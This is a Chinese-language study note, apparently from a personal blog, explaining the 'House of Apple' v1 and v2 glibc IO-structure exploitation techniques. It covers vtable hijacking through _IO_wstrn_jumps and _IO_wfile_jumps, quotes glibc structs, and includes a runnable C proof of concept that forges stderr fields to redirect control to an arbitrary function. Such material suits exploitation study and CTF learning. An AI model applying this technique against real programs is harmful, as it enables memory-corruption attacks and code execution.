# house of apple 原理细学习

## 参考文章:

- [[原创\] House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-273418.htm)
- [glibc 2.35 pwn——house of apple v1 示例程序_pwn house of apple-CSDN博客](https://blog.csdn.net/qq_54218833/article/details/128624427)

## 条件 

- 触发exit函数 / main函数返回
- 泄露heap地址 libc地址
- 可进行largebin attack

## house_of_apple1原理

> 这里阅读了大致逻辑后进行总结

- 首先是通过一次largebin劫持`_IO_list_all` 伪造	
- 构造时将`vatble`填写`_IO_wstrn_jumps` 
- 触发exit函数 exit调用`_IO_flush_all_lockp`（原本会遍历所有的`File`结构体依次执行overflow函数）<br>由于我们劫持了vtable 所以最终调用了`_IO_wstrn_overflow`函数 会将`File`结构体中的`_wide_data`字段保存的地址附近写入值

### 覆盖vatble

> 也就是覆盖`FILE`结构体0xd8偏移位置的数据 为`_IO_wstrn_jumps`地址

![image-20240423173604690](https://awaqwqa.github.io/img/house_of_apple/image-20240423173604690.png)

### 触发exit

- fcloseall

![image-20240423194735581](https://awaqwqa.github.io/img/house_of_apple/image-20240423194735581.png)

- _IO_cleanup

  ![image-20240423194855564](https://awaqwqa.github.io/img/house_of_apple/image-20240423194855564.png)

### 调用_IO_wstrn_overflow

- `_IO_wstrn_jumps`:

  ![image-20240423173959024](https://awaqwqa.github.io/img/house_of_apple/image-20240423173959024.png)

- 提取`vatble`(_IO_wstrn_jumps)调用overflow
  - ![image-20240423174606432](https://awaqwqa.github.io/img/house_of_apple/image-20240423174606432.png)

- 调用`_IO_wstrn_jumps`的`_IO_wstrn_overflow`函数
  - ![image-20240423174817889](https://awaqwqa.github.io/img/house_of_apple/image-20240423174817889.png)

### 覆写数据

> 根据`_IO_wstrn_overflow`可以知道`fp->_wide_data`地址所指区域会被覆写上`overflow_buff` 我们结合结构体来理解一下
>
> 可以发现`_wide_data`位于偏移`0xa0` 其中`_wide_data`偏移从0x0到0x30地址处都会被覆写上`fp->overflow_buf`(偏移`0xf0`)
>
> 那么就是我们构造的`FILE`结构体 `vtable`(0xd8)写上`_IO_wstrn_jumps`地址 `overflow_buf`(0xf0)写上我们想要覆盖的数据 比如
>
> backdoor地址之类的 `_wide_data`(0xa0)覆盖上我们想要修改的地址 那么最终就会在目标地址0x0到0x30处覆盖上我们的0xf0偏移处的数据  

#### 结构体`_IO_FILE_complete`

> 这个结构体包含了`_IO_FILE`结构体全部内容

```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

- ![image-20240423181313898](https://awaqwqa.github.io/img/house_of_apple/image-20240423181313898.png)

#### 结构体`_IO_wide_data`

```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```

- 查看一下偏移 gdb使用指令:`p *&_IO_wide_data_0`和`tel &_IO_wide_data_0` 

  ![image-20240423181623582](https://awaqwqa.github.io/img/house_of_apple/image-20240423181623582.png)

#### 结构体` _IO_wstrnfile`

```c
typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  wchar_t overflow_buf[64];
} _IO_wstrnfile;

```

### 示意图

![image-20240425164628090](https://awaqwqa.github.io/img/house_of_apple/image-20240425164628090.png)

## house_of_apple 2原理

> 学习文章:[[原创\] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-273832.htm)
>
> 核心还是劫持vtable 只不过需要绕过一下新版本中对`vtable`地址的检测 这里主要是讲一下原理 其他部分还是主要做题遇到再查

### _IO_OVERFLOW调用

```python
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```

- 我们可以发现这个调用最终会调用`IO_validate_vtable ` 然后会触发检查vatble是否合法 所以我们得想办法绕过

###  _IO_wfile_overflow的调用

> 这个函数存在于 `_IO_wfile_jumps` ,`_IO_wfile_jumps_mmap`和`_IO_wfile_jumps_maybe_mmap`等虚表中 所以我们的vtable直接填写这三个中任意一个即可 我们可以发现调用这个的时候并不存在vatble的检查 这样我们就可以轻松愉快地劫持`vatble`了

```c
const struct _IO_jump_t _IO_wfile_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
    // koko da you
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
const struct _IO_jump_t _IO_wfile_jumps_mmap libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
    //  koko da you
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close_mmap),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_new_file_finish),
    //  koko da you
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
  JUMP_INIT(xsputn, _IO_wfile_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_wfile_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf_mmap),
  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
  JUMP_INIT(doallocate, _IO_wfile_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

```

- 我们看看这个函数的调用链

  ```c
  #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
  #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
  #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
  #define _IO_WIDE_JUMPS(THIS) \
    _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
  ```

  - 我们可以发现这里就没有vatble的检查了 

- 所以我们可以将 `vtable`改为`_IO_wfile_jumps`(加减偏移) 触发exit函数

  - 这样就会调用`_IO_wfile_overflow`函数 

  - 以及我们发现这里调用的是`_wide_data->_wide_vatble` 已经知道`_wide_data`相对于`File`结构体来说偏移值为`0xa0`  我们可以在伪造的`File`结构体0xa0位置填写上可控的一个chunk地址 这个chunk写上我们想要调用的函数

#### 示意图

> 总结就是(仅伪造_wide_data) 我们要伪造三个chunk 一个在`_wide_data`(0xa0)位置写入指针指向第二个chunk 然后第二个chunk要在`_wide_vtable`（0xe0）位置写第三个chunk 0x18位置写入我们要触发的函数 这样就完成了一次函数的劫持

![image-20240425165104955](https://awaqwqa.github.io/img/house_of_apple/image-20240425165104955.png)

#### 原理脚本

> 这里贴出[[原创\] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-273832.htm)文章中的脚本

- 关于`_IO_FILE_plus`结构体部分

  - `_flags` (0x0)改为0x800

  - `_mode`(0xc0)设置为1

  - `vtable`(0xd8)设置为`_IO_wstrn_jumps-0x20`
  - `_wide_data`(0xa0)设置为`fake _wide_data`

- 关于`_wide_data`
  - `_wide_vatble`(0xe0)设置为`fake _wide_vatble`
- 关于`_wide_vatble`
  - 0x18位置改为我们要执行函数的地址

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>
 
void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}
 
void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);
 
    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    puts("[*] allocate two 0x200 chunks");
 
    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x84420;
    printf("[*] libc base address: %p\n", (void *)libc_base_addr);
 
    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;
    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);
 
    size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
  
    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    puts("[+] step 1: change stderr->_flags to 0x800");
    *(size_t *)stderr2 = 0x800;
 
    puts("[+] step 2: change stderr->_mode to 1");
    *(size_t *)(stderr2 + 0xc0) = 1;
  
    puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
    *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;
  
    puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
    *(size_t *)(stderr2 + 0xa0) = (size_t)p1;
  
    puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
    *(size_t *)(p1 + 0xe0) = (size_t)p2;
 
    puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
    *(size_t *)(p1 + 0x20) = (size_t)1;
 
    puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
    *(size_t *)(p2 + 0x18) = (size_t)(&backdoor);
 
    puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
    fflush(stderr);
}
```
